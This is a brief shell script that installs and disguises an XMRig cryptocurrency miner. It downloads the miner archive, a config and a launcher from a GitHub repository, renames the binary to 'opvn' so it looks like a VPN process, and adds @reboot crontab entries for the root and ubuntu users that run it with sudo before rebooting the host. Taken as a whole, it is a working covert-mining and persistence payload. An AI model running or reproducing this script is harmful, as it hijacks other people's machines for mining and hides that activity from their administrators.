cd /home/*
wget https://github.com/bondbenz1821/opme/raw/main/opme.tar.gz
tar -xzsf opme.tar.gz
mv xmrig* opvn
cd opvn/
mv xmr* opvn

mv config.json config.json.bk
wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json
wget https://raw.githubusercontent.com/bondbenz1821/opme/main/opvn.sh
chmod +x opvn.sh

(crontab -u root -l; echo "@reboot cd /home/azureuser/opvn && sudo ./opvn 2>&1 &" ) | crontab -u root -
(crontab -u ubuntu -l; echo "@reboot cd /home/ubuntu/opvn && sudo ./opvn 2>&1 &" ) | crontab -u ubuntu -
sudo reboot
#
#sudo ./opvn.sh 2>&1 &

#nohup sh opvn.sh > result.log 2>&1 &
